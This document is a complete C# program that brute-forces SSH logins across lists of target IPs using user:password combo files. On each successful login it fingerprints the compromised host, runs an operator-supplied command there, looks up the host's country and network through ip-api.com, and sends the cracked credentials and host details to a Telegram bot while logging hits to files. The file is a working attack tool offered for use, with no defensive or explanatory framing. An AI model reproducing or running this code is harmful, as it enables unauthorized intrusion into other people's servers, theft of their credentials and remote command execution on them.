using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using Renci.SshNet;
using Telegram.Bot;

class Program
{
    private static int openedConnections = 0, passwdChanged = 0, ipsInQueue = 0, ipsProcessed = 0, successfulLogins = 0, failedLogins = 0;
    private static TimeSpan timeouts = TimeSpan.FromSeconds(8);
    private static object countersMutex = new object();
    private static StringBuilder resultBuffer = new StringBuilder();
    private static StringBuilder formattedBuffer = new StringBuilder();
    private static object bufferMutex = new object();
    private static int bufferLimit = 100;

    private static Dictionary<string, bool> processingIPs = new Dictionary<string, bool>();
    private static object processingIPsMutex = new object();

    private static Dictionary<string, bool> successfulIPs = new Dictionary<string, bool>();
    private static object successfulIPsMutex = new object();
    private static Queue<string> successfulIPsQueue = new Queue<string>();

    private static Dictionary<string, bool> sentMessages = new Dictionary<string, bool>();
    private static object sentMessagesMutex = new object();

    private const string telegramToken = "11111"; // telegram bot token goes here
    private const long chatID = 1234L;  // telegram chat ID here replace 1234, keep the L

    private static string[] cpuModelCmds = {
    "lscpu | grep 'Model name'",
    "cat /proc/cpuinfo | grep 'model name' | head -1",
    "sysctl -n machdep.cpu.brand_string",
    "dmidecode -s processor-version",
    "dmesg | grep 'CPU:' | head -1"
    };

    private static string[] invalidOutputs = {
        "Please login:",
        "User name or password is wrong, please try it again!",
        "Access denied",
        "Permission denied",
        "Login incorrect",
        "Invalid user or password",
        "Authentication failed",
        "Login failed",
        "Unauthorized",
        "Login timeout",
        "Error: Unable to authenticate",
        "User not recognized",
        "User not found",
        "Invalid credentials",
        "Account locked",
        "Account disabled",
        "Password expired",
        "Session terminated",
        "Connection closed by foreign host",
        "Login aborted",
        "Invalid argument",
        "Remote command execution denied",
        "sh: echo: command not found",
        "tcsetattr error!",
        "This account is locked, try again later",
        "Entering character mode",
        "Escape character is '^]'.",
        "BAD COMMAND 'echo",
        "COMMAND SYNTAX ERROR"
    };

    private static bool ContainsInvalidOutput(string output)
    {
        return invalidOutputs.Any(invalidOutput => output.Contains(invalidOutput));
    }

    private static void GetHostDetails(string ip, out string country, out string AS)
    {
        country = string.Empty;
        AS = string.Empty;
    
        try
        {
            using (var httpClient = new System.Net.Http.HttpClient())
            {
                var response = httpClient.GetStringAsync($"http://ip-api.com/json/{ip}").Result;
                var jsonResponse = Newtonsoft.Json.JsonConvert.DeserializeObject<dynamic>(response);
    
                if (jsonResponse.status == "success")
                {
                    country = jsonResponse.country;
                    AS = jsonResponse.@as;
                }
            }
        }
        catch
        {
            // TODO: handle exceptions
        }
    }

    private static void SendMessageToBot(TelegramBotClient bot, string message)
    {
        lock (sentMessagesMutex)
        {
            if (!sentMessages.ContainsKey(message))
            {
                bot.SendTextMessageAsync(chatID, message).Wait();
                sentMessages[message] = true;
            }
        }
    }

    private static void WriteBufferedResults()
    {
        File.AppendAllText("hits.txt", resultBuffer.ToString());
        File.AppendAllText("hits-format.txt", formattedBuffer.ToString());

        resultBuffer.Clear();
        formattedBuffer.Clear();
    }

    private static void UpdateCounter(ref int counter)
    {
        lock(countersMutex)
        {
            counter++;
        }
    }

    private static void PrintStatus()
    {
        Console.WriteLine($"Queue: {ipsInQueue}");
        Console.WriteLine($"Processed: {ipsProcessed}");
        Console.WriteLine($"Successful: {successfulLogins}");
        Console.WriteLine($"Failed: {failedLogins}");
        Console.WriteLine($"Threads Running: {openedConnections}");
    }

    private static bool TrySSHLogin(string ip, string port, string user, string password, string commandToRun, out string output, out string uname, out string uptime, out string cpuModel, out string processors)
    {
        uname = string.Empty;
        uptime = string.Empty;
        cpuModel = string.Empty;
        processors = string.Empty;
    
        try
        {
            var connectionInfo = new PasswordConnectionInfo(ip, int.Parse(port), user, password)
            {
                Timeout = timeouts,
            };
    
            using (var client = new SshClient(connectionInfo))
            {
                client.HostKeyReceived += (sender, e) => e.CanTrust = true;
    
                client.Connect();
    
                UpdateCounter(ref openedConnections);
    
                if (client.IsConnected)
                {
                    uname = client.CreateCommand("uname -a").Execute();
                    uptime = client.CreateCommand("uptime -p").Execute();
                    foreach (var cmd in cpuModelCmds)
                    {
                        var tempOutput = client.CreateCommand(cmd).Execute();
                        if (!string.IsNullOrWhiteSpace(tempOutput))
                        {
                            cpuModel = tempOutput;
                            break;
                        }
                    }
                    processors = client.CreateCommand("nproc").Execute();
    
                    var cmdMain = client.CreateCommand(commandToRun);
                    output = cmdMain.Execute();
    
                    UpdateCounter(ref successfulLogins);
    
                    client.Disconnect();
    
                    if (string.IsNullOrEmpty(output) || ContainsInvalidOutput(output))
                        return false;
    
                    return true;
                }
                else
                {
                    UpdateCounter(ref failedLogins);
                }
    
                Thread.Sleep(2000); // login delay in between combo attempts
    
                output = string.Empty;
                return false;
            }
        }
        catch (Exception ex)
        {
            if (ex.Message.Contains("Too Many Authentication Failures"))
            {
                return TrySSHLogin(ip, port, user, password, commandToRun, out output, out uname, out uptime, out cpuModel, out processors);
            }
    
            Console.WriteLine($"Error connecting to {ip}:{port} with {user}:{password}. Error: {ex.Message}");
            output = string.Empty;
            return false;
        }
    }
    
    private static void ProcessTarget(string target, string port, List<(string user, string password)> logins, string commandToRun, TelegramBotClient bot)
    {
        lock (processingIPsMutex)
        {
            if (processingIPs.ContainsKey(target))
                return;
            processingIPs[target] = true;
        }
    
        bool successful = false;
    
        foreach (var (user, password) in logins)
        {
            lock (successfulIPsMutex)
            {
                if (successfulIPs.ContainsKey(target))
                    break;
            }
    
            if (TrySSHLogin(target, port, user, password, commandToRun, out var output, out var uname, out var uptime, out var cpuModel, out var processors))
            {
                successful = true;
    
                var country = string.Empty;
                var AS = string.Empty;
    
                GetHostDetails(target, out country, out AS);
    
                lock (successfulIPsMutex)
                {
                    if (!successfulIPs.ContainsKey(target))
                    {
                        successfulIPs[target] = true;
                        successfulIPsQueue.Enqueue(target);
                    }
                }
    
                lock (bufferMutex)
                {
                    resultBuffer.AppendLine($"{target}:{port} {user}:{password}");
                    formattedBuffer.AppendLine($"{target}:{port} {user}:{password}");
                }
    
                var botMessage = new StringBuilder();
                botMessage.AppendLine($"[ Login ] {user}@{target}   {port}");
                botMessage.AppendLine($"[ Password ] {password}");
                botMessage.AppendLine($"[ Uname ] {uname.Trim()}");
                botMessage.AppendLine($"[ Uptime ] {uptime.Trim()}");
                botMessage.AppendLine($"[ CPU Model ] {cpuModel.Trim()}");
                botMessage.AppendLine($"[ Processors ] {processors.Trim()}");
                botMessage.AppendLine($"[ AS / HOST ] {AS.Trim()}");
                botMessage.AppendLine($"[ COUNTRY ] {country.Trim()}");
    
                SendMessageToBot(bot, botMessage.ToString());
            }
        }
    
        if (!successful)
        {
            lock (countersMutex)
            {
                failedLogins++;
            }
        }
    }

    static void Main(string[] args)
    {
        if (args.Length < 5)
        {
            Console.WriteLine("Usage: nameOFexe ipfile loginsfile port threads \"commandtorunonservers\"");
            return;
        }
    
        var ipFile = args[0];
        var loginsFile = args[1];
        var port = args[2];
        var threads = int.Parse(args[3]);
        var commandToRun = args[4];
    
        var bot = new TelegramBotClient(telegramToken);
    
        var logins = new List<(string user, string password)>();
        foreach (var line in File.ReadAllLines(loginsFile))
        {
            var parts = line.Split(':');
            if (parts.Length == 2)
            {
                var user = parts[0].Trim();
                var password = parts[1].Trim();
                logins.Add((user, password));
            }
            else if (parts.Length == 1)
            {
                if (line.EndsWith(":"))
                {
                    var user = parts[0].Trim();
                    logins.Add((user, ""));
                }
                else
                {
                    var password = parts[0].Trim();
                    logins.Add(("", password));
                }
            }
        }
    
        var ips = File.ReadAllLines(ipFile).Distinct().ToList();
    
        var semaphore = new SemaphoreSlim(threads);
        foreach (var target in ips)
        {
            lock (countersMutex)
            {
                ipsInQueue++;
            }
    
            semaphore.Wait();
    
            ThreadPool.QueueUserWorkItem(state =>
            {
                ProcessTarget(target, port, logins, commandToRun, bot);
                semaphore.Release();
    
                lock (countersMutex)
                {
                    ipsInQueue--;
                    ipsProcessed++;
                }
    
                if (successfulIPsQueue.Count >= bufferLimit)
                {
                    lock (bufferMutex)
                    {
                        WriteBufferedResults();
                        successfulIPsQueue.Clear();
                    }
                }
    
                Console.WriteLine($"Queue: {ipsInQueue}, Processed: {ipsProcessed}, Successful: {successfulLogins}, Failed: {failedLogins}");
            });
        }
    
        for (int i = 0; i < threads; i++)
        {
            semaphore.Wait();
        }
    
        WriteBufferedResults();
    }
    }
